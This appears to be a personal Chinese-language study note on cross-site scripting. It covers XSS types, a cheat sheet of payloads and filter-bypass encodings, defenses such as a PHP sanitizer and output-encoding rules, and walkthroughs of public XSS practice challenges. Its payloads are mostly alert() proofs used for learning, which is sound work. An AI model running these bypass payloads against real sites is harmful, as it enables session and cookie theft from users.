## 1.XSS漏洞原理

XSS漏洞形成的原因是将本该输入的正常数据当作js脚本执行了

## 2.XSS类型及构造方法

（1）类型

* 反射型

* 存储型

  存储型XSS一般出现在网站的留言、评论、博客日志等交互处

* DOM型

  是特殊的反射型，不会经过服务器端，直接在客户端进行处理

  ```
  DOM可以看成是一个访问HTML的标准程序接口
  整个过程都是在前端完成的，没有后端的参与（纯前端的操作！）
  ```

（2）构造方法

[XSS Cheat Sheet 中文版](http://www.52bug.cn/hacktool/211.html)

```
//
```



* 利用<>标记

  ```
  <script>alert(1);</script>
  ```

* 利用HTML标签属性

  ```
  <img src="javascript:alert(1);">
  另外：href lowsrc bgsound background value action dynsrc
  ```

* 空格回车Tab

  ```
  <img src="javas cript:alert(1);">
  <img src="javas 
  cript:alert(1);">
  ```

* 对标签属性值进行转码

  ```
  <img src="javasc&#114;ipt:alert(1);">
  另：可以把&#01,&#02等字符插入到js的头部
  Tab：&#9 换行符：&#10  回车符：&#13  可以插入到代码中任意地方
  ```

* 产生自己的事件

  ```
  <img scr="#" onerror=alert(1);>
  onclick
  onResume
  onReverse
  ....
  ```

* 利用CSS

  ```
  <img style="background-image:url(javascript:alert(1))">
  //expression好像不再使用
  //<img style="background-image:expression(alert(1))">
  <style>@import 'javascript:alert(1)';</style>
  ```

* 扰乱过滤规则

  ```
  //转换大小写，大小写混淆
  //双引号，单引号，不使用引号
  //
  //全角字符
  // /**/
  //样式标签中的\和\0,转码，改变编码中0的个数
  //注释
  
  ```

* 字符编码

  ```
  <img src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
  另：换成10进制也行，每个数前加0也行
  
  <script>eval(\x61\x6c\x65\x72\x74\x28\x31\x29\x3b)</script>//16进制
  
  <img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41,59))">//10进制
  
  //脚本加密：JScript Encode VBScript Encode
  
  
  ```

  

* 拆分

  
  
* 其他

  ```
  //不断刷新
  <meta http-equiv="refresh" content="0;">
  //嵌入其他网站的链接
  <iframe src=http://www.xxx.com width=0 height=0></iframe>
  ```


## 3.寻找XSS

### 1.手动



### 2.XSS Fuzzing

https://www.cnblogs.com/qyun/p/6623754.html

## 4.XSS危害

1.Cookie窃取

2.会话劫持

（1）Session

* 访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session
* Session保存在服务器端的内存里，Cookie保存在浏览器或客户端文件里

（2）实现权限提升

* 攻击者利用XSS劫持了用户的会话去执行某些恶意操作（或攻击），这些操作往往能达到提升权限的目的
* 会话的概念一般是基于Cookie的，会话劫持的本质是在攻击中带上了Cookie并发送到服务器端

（3）获取网站的webshell

* 一句话木马
* 备份数据库

3.网络钓鱼

（1）基本

* 构造钓鱼页面，一般主要是登录表单部分，其代码可以从真页面复制过去
* 修改远程服务器接收信息的地址
* 再构造XSS，当用户点击该链接，会加载伪造的钓鱼页面

（2）钓鱼方式

* 重定向
* HTML注入
* XSS框架
* Flash钓鱼
* 注入js脚本劫持
* 键盘记录
* 遍历Form表单元素，抓取重要信息

4.搜索记录和浏览记录

* js可以读取任意元素的CSS信息，能分辨浏览器应用了哪种样式和用户是否访问过该链接
* 把用户可能访问的网站列表记录下来，然后通过JavaScript遍历其列表检查相应超级链接的属性

5.窃取客户端信息

（1）Js实现端口扫描

（2）截获剪贴板内容

（3）获取客户端IP

6.网页挂马

（1）常见木马

7.DOS和DDOS

（1）基础

* DOS是指拒绝服务攻击，这种攻击会利用大量的数据包“淹没”目标主机，耗尽资源导致系统崩溃，使目标主机无法对合法用户做出反应
* DDOS是指分布式拒绝服务攻击，攻击者利用互联网上成千上万的僵尸主机对攻击目标发动威力巨大的拒绝服务攻击



## 5.XSS防御

（1）输入过滤，输出编码

* 输入是否仅仅包含合法的字符

* 输入字符串是否超过最大长度限制

* 输入如果为数字，数字是否在指定范围

* 输入是否符合特殊的格式要求

* 过滤敏感字符，比如：< > ' " & # javascript expression

* 使用htmlspecialchars()之类的函数

  

（2）白名单，黑名单

![截图录屏_选择区域_20200605214736](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200605214736.png)

（3）常用过滤函数

```
<?php
function xss_clean($data)
{
// Fix &entity\n;
$data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data);
$data = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $data);
$data = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $data);
$data = html_entity_decode($data, ENT_COMPAT, 'UTF-8');
 
// Remove any attribute starting with "on" or xmlns
$data = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $data);
 
// Remove javascript: and vbscript: protocols
$data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $data);
$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $data);
$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $data);
 
// Only works in IE: <span style="width: expression(alert('Ping!'));"></span>
$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $data);
 
// Remove namespaced elements (we do not need them)
$data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data);
do
{
        // Remove really unwanted tags
        $old_data = $data;
        $data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data);
}
while ($old_data !== $data);
 
// we are done...
return $data;
}
?>
```

（4）编码规范

* body文本

  ```
  < 转成 &lt;
  > 转成 &gt;
  & 转成 &amp;
  " 转成 &quot;
  ' 转成 &#39
  ```

* HTML标签中的内容

  ```
  < 转成 &lt;
  > 转成 &gt;
  & 转成 &amp;
  " 转成 &quot;
  ' 转成 &#39
  ```

* `<script></script>中的内容`

  ```
  ' 转成 \'
  " 转成 \"
  \ 转成 \\
  / 转成 \/
  
  ```

  

* JavaScript事件

  ```
  < 转成 &lt;
  > 转成 &gt;
  & 转成 &amp;
  " 转成 &quot;
  ' 转成 &#39
  \ 转成 \\
  / 转成 \/
  ```

  

* URL属性

  ```
  规定href和src值是以http://开头
  规定不能有十进制和十六进制的编码字符
  规定属性以双引号"界定
  
  HTML和JavaScript环境：
  < 转成 %3C
  > 转成 %3E
  " 转成 %22
  ' 转成 %27
  \ 转成 %5C
  / 转成 %2F
  
  字符对URL的影响：
  空格 转成 %20
  + 转成 %2B
  = 转成 %3D
  % 转成 %25
  & 转成 %26
  # 转成 %23
  ? 转成 %3F
  / 转成 %2F
  
  ```

（5）防御DOM-Based XSS

* 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现

* 分析和强化客户端代码，尤其是一些受到用户影响的DOM对象

  ```
  document.URL
  document.URLUnencoded
  document.location(.pathname|.href|.search|.hash)
  window.location(.pathname|.href|.search|.hash)
  document.referer
  window.name
  document.cookie
  HTML5 postMessage
  localStorage/globalStorage
  XMLHTTPRequest response
  Input.value
  ```

  ![截图录屏_选择区域_20200614083930](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200614083930.png)

* 把变量输出到页面时注意编码，根据不同语境采用不同的编码

（6）其他

* Anti_XSS

* HttpOnly Cookie

  开启

  ![截图录屏_选择区域_20200614084652](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200614084652.png)

  ![截图录屏_选择区域_20200614084707](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200614084707.png)

* NoScript

* WAF

（7）防御CSRF

* 使用POST方式替代GET
* 检验HTTP Referer
* 验证码
* 使用token





## 6.XSS练习

### 1.XSSgame

链接地址：https://xss-game.appspot.com/

### 2.XSS Challenges

链接地址：[http://xss-quiz.int21h.jp/](http://xss-quiz.int21h.jp/)

（1）

![截图录屏_选择区域_20200607071502](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200607071502.png)

​		`"><script>alert(document.domain)</script><"`

​		这题使用`<script>alert(document.domain)</script>` 也行

（2）

![截图录屏_选择区域_20200607071934](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200607071934.png)

​		`"><script>alert(document.domain)</script><"`

（3）

![截图录屏_选择区域_20200602150259](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602150259.png)

输入的" ， <，> 被编码了，但后面的`<b>Japan</b>`感觉没有任何过滤

抓包，发现可以改包

![截图录屏_选择区域_20200602150407](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602150407.png)

![截图录屏_选择区域_20200607073146](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200607073146.png)

（4）

![截图录屏_选择区域_20200602151205](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602151205.png)

同样的操作，抓包

![截图录屏_选择区域_20200602151052](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602151052.png)

![截图录屏_选择区域_20200602151452](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602151452.png)

（5）

![截图录屏_选择区域_20200602151536](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602151536.png)

可以直接修改maxlength的大小

或者抓包再改包

（6）

![截图录屏_选择区域_20200602151731](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602151731.png)

“没有被过滤，可以考虑添加事件

`" onclick=alert(document.domain) "`

（7）

![截图录屏_选择区域_20200602152938](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602152938.png)

![截图录屏_选择区域_20200602152244](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602152244.png)

![截图录屏_选择区域_20200602152801](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602152801.png)

一开始value后带有引号，进行测试后发现value后的值没有自动添加引号""，直接用=连接值，真是没想到

![截图录屏_选择区域_20200602153039](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602153039.png)

直接 `12 onclick=alert(document.domain)`

（8）生成一个链接

![截图录屏_选择区域_20200607074125](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200607074125.png)

![截图录屏_选择区域_20200607074144](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200607074144.png)

`javascript:alert(document.domain)`

（9）

![截图录屏_选择区域_20200602154203](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602154203.png)

![截图录屏_选择区域_20200602154250](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602154250.png)

这题真是的，希望能把hiden改成text

但是改不了

于是

![截图录屏_选择区域_20200602161050](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602161050.png)

![截图录屏_选择区域_20200602161101](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602161101.png)

![截图录屏_选择区域_20200602161109](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602161109.png)

（10）

![截图录屏_选择区域_20200602161320](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602161320.png)

过滤了domain

可以换成`"><script>alert(document.dodomainmain)</script><"`

（11）

![截图录屏_选择区域_20200602162510](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602162510.png)

![截图录屏_选择区域_20200602162418](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602162418.png)

![截图录屏_选择区域_20200602162539](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602162539.png)

发现a标签没有被过滤

对`script`中字母进行编码

`"><a href="java&#115;cript:alert(1);">aaaaaaaa</a><"`

（12）

![截图录屏_选择区域_20200602163840](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602163840.png)

![截图录屏_选择区域_20200602164701](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602164701.png)

我还以为会把空格去掉

真是没办法

（13）

![截图录屏_选择区域_20200602165722](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602165722.png)

![截图录屏_选择区域_20200602165741](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602165741.png)

据说要使用IE，而且要使用IE6或IE7

（14）

http://xss-quiz.int21h.jp/stage-_-14.php?sid=a89db6cb39100f81172a4263b900a40083556287



（15）

（16）

（17）

（18）

（19）



### 3.XSS挑战

地址：http://test.ctf8.com/

总结：

1.找到输入的地方插入js代码，比如（1）（2）

2.",<,>被过滤了，或者',<,>被过滤了，调用事件 `onclick=alert(1)` ,比如（3）（4）

3.`<script>`,`onclick`,`onerror`被过滤了（插入字符），可以使用`<a href="javascript:alert(1)">`，比如（5）

4.`<a>`,`<script>`,`<img>`,被过滤（插入字符），可以使用`<SCRIPT>`，比如（6）

5.`<script>`,完全被过滤（消失），可以使用重复的`<scrscriptipt>`，比如（7）

6.`script`中`r`被过滤（插入字符），可以对r进行编码（可以是html ascii），比如（8）

7.第（9）题

要输入http://×××之类的才可以

这一题对script有过滤，可以进行编码

`javasc&#114;ipt:%0dhttp://www.abc.com%0dalert(1)`

不明白为什么加入了回车就可以了？？？？

8.将hide属性改为text，再插入js脚本，在搜索框直接使用具有隐藏属性的值，比如（10），还有抓包比如(11)(12)(13)

9.第（14）（15）不太懂

10.有空位标签`<center></center>`,中间没有任何文本，而且之前的经常出现在搜索框的值是keyword，因此可以注入，但此处过滤了`<script>`,和`<img>`中的部分元素，使用`%3Cimg%0dsrc=1%0donerror=alert('ok')%3E`，urlEncod，(16)

11.仔细观察输入框上的变量，（17）

12.（18）（19）（20）不会

![截图录屏_选择区域_20200528201335](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528201335.png)

（1）

![截图录屏_选择区域_20200528201450](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528201450.png)

（2）

![截图录屏_选择区域_20200528201514](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528201514.png)

![截图录屏_选择区域_20200528201534](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528201534.png)

（3）

![截图录屏_选择区域_20200527215721](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527215721.png)

![截图录屏_选择区域_20200527215713](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527215713.png)

",<,>都被过滤了，可以使用onclick，输入`' onclick=alert(1) '` 

![截图录屏_选择区域_20200527221553](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527221553.png)

（4）过滤了<>，但”没有被过滤

![截图录屏_选择区域_20200527221822](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527221822.png)

（5）还是没有过滤"

![截图录屏_选择区域_20200527220857](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527220857.png)

一样的操作不起作用了

![截图录屏_选择区域_20200527221947](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527221947.png)

注意没有过滤<>，居然

![截图录屏_选择区域_20200527222223](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527222223.png)

使用a标签

![截图录屏_选择区域_20200527222505](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527222505.png)

（6）同样的操作

![截图录屏_选择区域_20200527222703](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527222703.png)

![截图录屏_选择区域_20200527222814](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527222814.png)

![截图录屏_选择区域_20200527222856](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527222856.png)

试试大写

![截图录屏_选择区域_20200527223053](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223053.png)

（7）将script过滤掉了,可以使用重复的script

![截图录屏_选择区域_20200527223208](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223208.png)

![截图录屏_选择区域_20200527223322](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223322.png)

![截图录屏_选择区域_20200527223349](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223349.png)

![截图录屏_选择区域_20200527223426](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223426.png)

使用多个script

![截图录屏_选择区域_20200527223623](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223623.png)

（8）

![截图录屏_选择区域_20200527223830](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527223830.png)

![截图录屏_选择区域_20200527224149](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527224149.png)

总是在r后插入_，可以考虑将r编码

![截图录屏_选择区域_20200528061318](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528061318.png)

（9）这题不太懂

`javasc&#114;ipt:%0dhttp://www.0aa.me%0dalert('ok')`

![截图录屏_选择区域_20200528190624](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528190624.png)

![截图录屏_选择区域_20200528190647](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528190647.png)

（10）将hidden属性改为text

试了t_link和t_history都没有反应，在试t_sort时发现出现了一个框

![截图录屏_选择区域_20200528191527](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528191527.png)

![截图录屏_选择区域_20200528191548](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528191548.png)

（11）上一题的结果

http://test.ctf8.com/level11.php?keyword=good%20job!

![截图录屏_选择区域_20200528192256](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528192256.png)

抓包（注意，要在第10题跳转至第11题的时候抓包）

![截图录屏_选择区域_20200528192448](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528192448.png)

![截图录屏_选择区域_20200528192545](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528192545.png)

![截图录屏_选择区域_20200528192558](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528192558.png)

（12）

![截图录屏_选择区域_20200528192842](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528192842.png)

熟悉的操作，很像User-Agent

![截图录屏_选择区域_20200528193112](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193112.png)

![截图录屏_选择区域_20200528193426](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193426.png)

![截图录屏_选择区域_20200528193215](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193215.png)

（13）同样的操作

![截图录屏_选择区域_20200528193738](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193738.png)

![截图录屏_选择区域_20200528193826](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193826.png)

![截图录屏_选择区域_20200528193956](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193956.png)

![截图录屏_选择区域_20200528193907](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528193907.png)

（14）

![截图录屏_选择区域_20200528194302](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528194302.png)

![截图录屏_选择区域_20200528194351](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528194351.png)

![截图录屏_选择区域_20200528194432](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528194432.png)

（15）

（16）

![截图录屏_选择区域_20200528195034](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195034.png)

![截图录屏_选择区域_20200528195005](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195005.png)

![截图录屏_选择区域_20200528195012](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195012.png)

![截图录屏_选择区域_20200528195137](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195137.png)

![截图录屏_选择区域_20200528195147](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195147.png)

![截图录屏_选择区域_20200528195232](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195232.png)

![截图录屏_选择区域_20200528195242](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195242.png)

使用urlEncode  `%3Cimg%0dsrc=1%0donerror=alert('ok')%3E`

![截图录屏_选择区域_20200528195333](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195333.png)

（17）

![截图录屏_选择区域_20200528200045](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528200045.png)

![截图录屏_选择区域_20200528200035](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528200035.png)

![截图录屏_选择区域_20200528195938](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528195938.png)

![截图录屏_选择区域_20200528200015](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528200015.png)

（18）

（19）

（20）



### 4.alert(1) to win

链接地址：https://alf.nu/alert1

总结

1.有fucntion("")之类的，一般会闭合引号和括号，或者直接闭合`<script>`

2.引号被转义，在前插入\,对于左边的引号，可输入`\"`,将变成`"\\"`,实际显示时为`"\"`,后面的直接注释掉

3.

（1）有fucntion("")之类的，一般会闭合引号和括号，两端有script的，直接写入alert(1)

![截图录屏_选择区域_20200527202622](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527202622.png)

（2）在每一个“前都插入一个\

​		左边的”：输入“后，引号会被转义，于是在”前输入一个\,取消\对“的转义\.然后直接使用`</script>` 结束，还可以增加//进行注释

![截图录屏_选择区域_20200527204451](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527204451.png)

（3）将js字符串转换成JSON文本，将"等特殊字符进行转义

直接使用`</scritp>` 进行闭合

![截图录屏_选择区域_20200527205925](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527205925.png)

（4）这一题要使用chrome浏览器

有4个正则替换，将<和"转换成实体字符

![截图录屏_选择区域_20200527212334](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527212334.png)

![截图录屏_选择区域_20200527212427](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527212427.png)

![截图录屏_选择区域_20200527212256](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527212256.png)

（5）

### 5.XSS Education

总结

1.传入的参数作为变量，在其他函数中输出，但是这里插入了多个js代码，可以直接闭合前面的`<script>` ,注释后面的`</script>` ，再插入alert(1)

2.搜索框有多个参数时，往往有一个能成为注入点

3.取值：`document.getElementById('idname').InnerHtml`

4.第（4）题不会

![截图录屏_选择区域_20200528210832](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528210832.png)

（1）

![截图录屏_选择区域_20200528210904](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528210904.png)

![截图录屏_选择区域_20200528210956](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528210956.png)

（2）

![截图录屏_选择区域_20200523192756](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200523192756.png)

输入`);</script><script>alert(1);</script>`

或者`a";alert(1);var q="a`

或者

![截图录屏_选择区域_20200528211509](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528211509.png)

（3）

![截图录屏_选择区域_20200528211748](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528211748.png)

![截图录屏_选择区域_20200528211819](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528211819.png)

![截图录屏_选择区域_20200523205341](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200523205341.png)

![截图录屏_选择区域_20200523205355](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200523205355.png)

控制q

在id后输入`123" </script><script>alert(1);</script>"`

![截图录屏_选择区域_20200523205618](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200523205618.png)

![截图录屏_选择区域_20200523210158](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200523210158.png)

后来测试出了一些奇奇怪怪的问题

![截图录屏_选择区域_20200528212511](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528212511.png)

![截图录屏_选择区域_20200528212739](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200528212739.png)

### 6.alert(1)

链接：https://xss.haozi.me/

0x00

这个直接输出就行

![截图录屏_选择区域_20200603220659](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603220659.png)

0x01

要将两端的`textarea`进行闭合

![截图录屏_选择区域_20200603221849](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603221849.png)

0x02

闭合`“和<>`

![截图录屏_选择区域_20200603222534](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603222534.png)

使用`onclick`，虽然也成功弹框，但后面的注释好像不起作用？？？？？

![截图录屏_选择区域_20200603222715](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603222715.png)

0x03

由于括号被过滤了，可以将括号编码，`<svg>` 的作用是？？？？？

![截图录屏_选择区域_20200603222843](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603222843.png)

或者，使用``，为什么可以使用 ???????

![截图录屏_选择区域_20200603222939](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603222939.png)

0x04

这个过滤了()和`，可以给括号编码

![截图录屏_选择区域_20200603223020](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223020.png)

0x05

要跳出注释，后边的注释很好解决，而且前面的注释解决了，后面的注释不解决也没有关系

![截图录屏_选择区域_20200603223140](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223140.png)

因为`-->`被过滤了

可以使用`--!>`，？？？？？？？

![截图录屏_选择区域_20200603223255](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223255.png)

0x06

只要出现`auto`，on××....××=或者>，就会被替换成_，所以on与=不能出现在同一行

比如：

![截图录屏_选择区域_20200603223350](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223350.png)

可以换行

![截图录屏_选择区域_20200603223433](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223433.png)

0x07

这个就是只要在`<>`中，就会被过滤掉

![截图录屏_选择区域_20200603223530](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223530.png)

如果去掉后面的`>`，还是有点问题

![截图录屏_选择区域_20200603223635](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223635.png)

留一个空格突然就行了？？？？？？

![截图录屏_选择区域_20200603223713](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603223713.png)



0x08

`</style>`会被换成`/*坏人*/`，将`</style>`分开来表示

比如有个空格

![截图录屏_选择区域_20200603224007](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224007.png)

换个行

![截图录屏_选择区域_20200603224042](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224042.png)

加个注释在中间

![截图录屏_选择区域_20200603224118](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224118.png)

使用重复的`</style>`

![截图录屏_选择区域_20200603224305](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224305.png)

0x09

这个就是说要匹配到`https://www.segmentfault.com`开头的输入才行，否则就直接输出`Invalid URL`

![截图录屏_选择区域_20200603224353](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224353.png)

![截图录屏_选择区域_20200603224456](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224456.png)

由于这个没有什么特殊的过滤，在输入以上开头后，闭合前面的`<script>` ,再加入自己的脚本

![截图录屏_选择区域_20200603224638](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224638.png)

0x0A



0x0B



0x0C



0x0D

首先肯定要换行来摆脱单行注释

![截图录屏_选择区域_20200603224805](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224805.png)

直接使用alert，后面的`')`会有影响

![截图录屏_选择区域_20200603224836](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224836.png)

于是要将其注释掉，`//`被过滤了，`<!--`中的`<`也被过滤掉了

`-->`也可以进行单行注释，但一定要换行

![截图录屏_选择区域_20200603224916](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224916.png)

![截图录屏_选择区域_20200603224948](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603224948.png)

0x0E



0x0F

这个的大致思路是要执行`alert(1)`，要闭合前面的`('` 和 后面的 `')` ,使用两个`；` 将其分成三个"语句"，好让中间`alert(1)`执行，但过滤的太多了，但？？？？居然过了？？？？

![截图录屏_选择区域_20200603225125](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603225125.png)

0x10

`window.data`是？？？？

这个就是直接输出了？？？？？

![截图录屏_选择区域_20200603225150](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603225150.png)

0x11

